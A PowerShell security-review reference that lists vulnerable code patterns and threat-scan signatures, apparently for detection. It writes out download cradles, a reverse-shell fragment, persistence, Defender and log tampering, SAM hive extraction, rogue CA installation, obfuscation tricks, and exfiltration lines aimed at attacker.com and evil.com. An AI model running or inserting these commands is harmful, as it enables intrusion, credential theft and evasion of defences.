# PowerShell — Security Checks

## Code Vulnerabilities (OWASP)

**Code Execution & Injection:**
- `Invoke-Expression $userInput` / `iex $userInput` — arbitrary code execution
- `& $command` / `.` (dot-sourcing) with user-controlled path — script execution
- `[scriptblock]::Create($userInput).Invoke()` — dynamic scriptblock creation → RCE
- `Start-Process -FilePath $userInput` — arbitrary process launch
- `New-Object -ComObject $userInput` — COM object instantiation, can be leveraged for execution
- `Add-Type -TypeDefinition $userCSharp` — compiles and loads user-controlled C# → RCE
- `Register-EngineEvent`, `Register-ObjectEvent` with user-controlled action scriptblocks
- String interpolation in commands: `"Get-Process $name"` — if used with `iex`, injection vector
- `$ExecutionContext.InvokeCommand.InvokeScript($userInput)` — hidden invoke path

**Credential & Secret Handling:**
- Plaintext credentials: `$password = "P@ssw0rd"` in scripts
- `ConvertTo-SecureString -AsPlainText` with hardcoded strings
- `Get-Credential` stored in `$cred` then `$cred.GetNetworkCredential().Password` logged
- `PSCredential` objects serialized with `Export-Clixml` — encrypted per-user per-machine, not portable but reveals credential existence
- `-Credential` parameter with plaintext: `Invoke-Command -Credential (New-Object PSCredential("admin", (ConvertTo-SecureString "pass" -AsPlainText -Force)))`
- Credentials in transcript/log files: `Start-Transcript` captures all output
- `$env:API_KEY` referenced but set in profile scripts committed to git
- `ConvertFrom-SecureString` output stored in files without proper ACLs

**Execution Policy & Bypass:**
- `Set-ExecutionPolicy Bypass` / `-ExecutionPolicy Bypass` — security theater but indicates intent
- `powershell -ep bypass -f script.ps1` — bypassing policy
- `Get-Content script.ps1 | iex` — policy bypass via piping
- `[System.Net.WebClient]::new().DownloadString($url) | iex` — download-and-execute (LOL: "download cradle")
- `$env:PSModulePath` manipulation — module hijacking
- AMSI bypass attempts: `[Ref].Assembly.GetType(...)` patterns
- `Add-Type` to load raw .NET assemblies — DLL sideloading

**File & Path Operations:**
- `Remove-Item -Recurse -Force $userPath` — path traversal → destructive
- `Get-Content $userPath` — arbitrary file read
- `Set-Content` / `Out-File` to user-controlled path — arbitrary write
- `Join-Path` does NOT prevent traversal — `Join-Path "C:\safe" "..\..\..\windows\system32\config\sam"` resolves upward
- `Resolve-Path` without prefix validation — same issue
- Missing `-LiteralPath` vs `-Path` — wildcards expanded in `-Path` but not `-LiteralPath`
- `New-PSDrive` with user-controlled root — map to unexpected locations
- Temp files via `[System.IO.Path]::GetTempFileName()` — predictable if not using `New-TemporaryFile`

**Network Operations:**
- `Invoke-WebRequest` / `Invoke-RestMethod` with `-SkipCertificateCheck` — TLS verification disabled
- `iwr $userUrl` — SSRF
- `New-PSSession -ComputerName $userInput` — remote session to user-controlled host
- `Enter-PSSession` / `Invoke-Command -ComputerName` with credential pass-through
- `Test-Connection` (ping) with user-controlled target — network probing
- `Send-MailMessage` with user-controlled body/attachments — data exfiltration
- WebSocket / HTTP listener via `System.Net.HttpListener` — backdoor server

**Active Directory & Windows Specific:**
- `Get-ADUser -Filter "$userFilter"` — LDAP filter injection
- `Get-ADUser -LDAPFilter "($userInput)"` — direct LDAP filter injection
- `Set-ADUser` / `Set-ADAccountPassword` without authorization checks
- `Add-ADGroupMember` — privilege escalation via group membership
- `Get-WmiObject` / `Get-CimInstance` with user-controlled queries
- Registry manipulation: `Set-ItemProperty -Path "HKLM:\..."` — system modification
- Service manipulation: `New-Service`, `Set-Service` — persistence mechanism
- Scheduled tasks: `Register-ScheduledTask` / `schtasks`
- WinRM configuration: `Enable-PSRemoting -Force` — enables remote access

**Module & Script Security:**
- Unsigned modules loaded from untrusted paths
- `Install-Module` from untrusted repositories — supply chain
- `Import-Module $userModule` — arbitrary module loading
- `.psm1` / `.psd1` files in `$env:PSModulePath` directories — module squatting
- DSC (Desired State Configuration) resources from untrusted Gallery
- `Update-Help` from untrusted URIs — potential for malicious help content

**CI/CD & Pipeline Patterns:**
- `$env:GITHUB_HEAD_REF`, `$env:GITHUB_REF_NAME` — attacker-controlled git refs in GitHub Actions Windows runners
- `$env:BUILD_SOURCEBRANCH`, `$env:BUILD_REQUESTEDFOR` — Azure DevOps pipeline variables, user-controlled
- `$(variableName)` macro syntax in Azure DevOps YAML — macro injection if variable is user-controlled
- `Invoke-Expression $env:SYSTEM_DEFAULTWORKINGDIRECTORY` — pipeline path injection
- `Publish-Module` / `Register-PSRepository` in CI — supply chain via untrusted module feeds
- `Install-Module -Force -Scope AllUsers` in pipeline — installing unverified modules system-wide
- Azure DevOps service connection tokens in `$env:SYSTEM_ACCESSTOKEN` — exposed to all pipeline steps
- `pwsh -File script.ps1` in GitHub Actions `run:` blocks — check for variable injection
- DSC configurations compiled and pushed via CI — infrastructure-as-code injection
- `Invoke-Pester` with user-controlled test paths — arbitrary script execution via test framework
- Artifact upload/download via `actions/upload-artifact` / `Publish-BuildArtifacts` — artifact poisoning

**Logging & Forensics Evasion:**
- `Clear-EventLog` — evidence destruction
- `wevtutil cl Security` / `wevtutil cl System` — clear specific Windows event logs
- `Stop-Service -Name "WinDefend"` — AV tampering
- `Set-MpPreference -DisableRealtimeMonitoring $true` — Defender disable
- `Set-MpPreference -ExclusionPath` — add exclusions to skip scanning directories
- `Remove-Item -Path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` — history deletion
- `$HistorySaveStyle = 'SaveNothing'` — disable command history
- `Set-PSReadLineOption -HistorySaveStyle SaveNothing` — modern equivalent
- `Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security' -Name MaxSize -Value 64KB` — shrink log to force overwrite
- `Disable-WindowsOptionalFeature -Online -FeatureName 'Windows-Defender'` — permanent Defender removal
- `Set-AuditPolicy` / `auditpol /set /category:* /success:disable /failure:disable` — disable Windows auditing
- Timestomping: `(Get-Item file.exe).LastWriteTime = '01/01/2020 00:00:00'` — anti-forensics
- `Remove-EventLog -LogName Application` — delete entire event log source

**I/O Redirection, Tunneling & MITM:**
- `System.Net.Sockets.TcpListener` — listening for inbound connections (reverse shell listener, backdoor)
- `System.Net.Sockets.TcpClient` streams used as I/O redirection — pipe stdin/stdout over network
- `System.IO.Pipes.NamedPipeServerStream` / `NamedPipeClientStream` — inter-process communication channel, can relay data
- `netsh interface portproxy add v4tov4 listenport=PORT connectaddress=TARGET connectport=PORT` — Windows port forwarding (persistent, survives reboot)
- `netsh interface portproxy show all` — enumerate existing port forwards
- `ssh.exe -L` / `ssh.exe -R` / `ssh.exe -D` — same SSH tunneling as *nix but via Windows OpenSSH
- `New-NetFirewallRule` — creating firewall exceptions for backdoor ports
- `Start-Process plink.exe -ArgumentList '-L ...'` — PuTTY-based port forwarding
- `[System.Net.WebProxy]` — setting process-level proxy to intercept/redirect traffic
- `$env:HTTP_PROXY` / `$env:HTTPS_PROXY` — environment-level proxy hijacking
- `winrm set winrm/config/client '@{TrustedHosts="*"}'` — trust any WinRM host → MITM
- `New-PSSession -UseSSL:$false` — unencrypted remote sessions → eavesdropping
- `Set-Item WSMan:\localhost\Client\TrustedHosts -Value *` — trust all hosts for WinRM
- `Register-EngineEvent` with network I/O in action block — covert event-triggered exfiltration
- `System.Net.HttpListener` — create HTTP listener for C2 communication
- `Invoke-WebRequest -Proxy $proxyUrl` — routing traffic through attacker proxy
- `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}` — disable all TLS cert validation globally → MITM
- DNS-over-HTTPS exfiltration: `Invoke-RestMethod "https://dns.google/resolve?name=$data.attacker.com"`
- `ConvertTo-SecureString` → `ConvertFrom-SecureString` piped to network — encrypted credential relay
- `Start-Job` with network operations — background covert channels

**SSL/TLS Certificate Manipulation:**
- `Import-Certificate -FilePath rogue-ca.crt -CertStoreLocation Cert:\LocalMachine\Root` — install rogue CA to Windows machine trust store
- `Import-Certificate -CertStoreLocation Cert:\CurrentUser\Root` — install rogue CA for current user (no admin required)
- `Import-PfxCertificate` — import certificate with private key bundle (impersonation)
- `New-SelfSignedCertificate` — generate rogue certificate for domain impersonation
- `Export-Certificate` / `Export-PfxCertificate` — extract existing certificates and private keys
- `Get-ChildItem Cert:\LocalMachine\Root | Remove-Item` — remove legitimate CAs from trust store
- `Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings' -Name 'CertificateRevocation' -Value 0` — disable CRL checking
- `certutil -addstore Root rogue-ca.cer` — Windows certutil CA installation
- `certutil -delstore Root <thumbprint>` — remove legitimate CA from store
- `certutil -importpfx` — import PFX bundle silently
- `[System.Net.ServicePointManager]::SecurityProtocol = 'Tls'` — force downgrade to weak TLS version
- `[System.Net.ServicePointManager]::CheckCertificateRevocationList = $false` — disable CRL/OCSP
- `$env:NODE_EXTRA_CA_CERTS` / `$env:SSL_CERT_FILE` — environment-level CA override for child processes
- `$env:GIT_SSL_NO_VERIFY = '1'` — disable git TLS verification
- `$env:REQUESTS_CA_BUNDLE` — Python CA override from PowerShell
- Modifying Java cacerts: `keytool -importcert -keystore "$env:JAVA_HOME\lib\security\cacerts"` — inject CA into JVM trust
- `New-NetIPsecRule` with rogue certificate — IPsec with attacker-controlled cert
- `Invoke-WebRequest | Select -Expand Certificate` — certificate harvesting/reconnaissance
- `Get-ChildItem Cert:\LocalMachine\My -HasPrivateKey` — enumerate extractable private keys

## Threat Scan Patterns

**Download Cradles:**
- `(New-Object Net.WebClient).DownloadString($url) | iex`
- `IEX (IWR $url -UseBasicParsing).Content`
- `[System.Reflection.Assembly]::Load((IWR $url).Content)`
- `Start-BitsTransfer -Source $url -Destination $path; & $path`
- `certutil -urlcache -f $url $path` — LOLBin download

**Reverse Shells:**
- `$client = New-Object System.Net.Sockets.TCPClient($ip, $port); $stream = $client.GetStream(); ...`
- PowerShell reverse shell via `nishang`, `PowerSploit`, `Empire` framework patterns
- `Invoke-PowerShellTcp`, `Invoke-PowerShellWmi` — known offensive tool functions

**Persistence:**
- `New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"` — startup persistence
- `Register-ScheduledTask` with encoded/obfuscated commands
- WMI event subscriptions: `Register-WmiEvent` / `Set-WmiInstance` for `__EventFilter`
- Profile modification: writing to `$PROFILE` / `$PROFILE.AllUsersAllHosts`

**Data Exfiltration:**
- `Invoke-WebRequest -Method POST -Body (Get-Content $file)` — file exfiltration via HTTP POST
- `Invoke-RestMethod -Method PUT -Body (Get-Content $file -Raw)` — REST-based exfil
- `Send-MailMessage -Attachments $file -To attacker@evil.com` — email exfiltration
- `$smtp = New-Object Net.Mail.SmtpClient; $smtp.Send(...)` — raw SMTP exfil
- `[System.Net.Sockets.TcpClient]` stream write with file content — raw TCP exfil
- DNS exfiltration: `Resolve-DnsName "$encodedData.attacker.com"` — data encoded in DNS queries
- ICMP exfiltration: `Test-Connection -BufferSize 1024 -Count 1 -ComputerName attacker.com` — data in ICMP payload (limited)
- `Start-BitsTransfer -TransferType Upload` — BITS-based file upload (LOLBin)
- `[System.IO.File]::ReadAllBytes()` piped to network stream — binary file exfil
- `Compress-Archive` then upload — compress before exfiltration to reduce detection
- `Get-Clipboard` / `Set-Clipboard` — clipboard data harvesting
- `Get-EventLog` / `Get-WinEvent` — harvest security logs for reconnaissance
- `Get-ADUser -Filter * -Properties *` — full AD enumeration for lateral movement planning
- Registry exfil: `reg save HKLM\SAM sam.save` / `reg save HKLM\SYSTEM sys.save` — credential database extraction
- Shadow copy access: `Get-WmiObject Win32_ShadowCopy` — access locked files via VSS

**Obfuscation:**
- `-EncodedCommand` / `-enc` with Base64 payload
- String concatenation: `$a="Inv"; $b="oke-"; $c="Exp"; &($a+$b+$c+"ression")`
- Tick escaping: `` I`nv`oke-`Exp`ress`ion `` — backtick obfuscation
- `[char]` array construction: `[char[]](73,69,88) -join ''` → "IEX"
- Replace obfuscation: `"Invoke-Expressiox" -replace 'x','n'`
- `Format-*` operator obfuscation: `("{0}{1}" -f 'ie','x')"
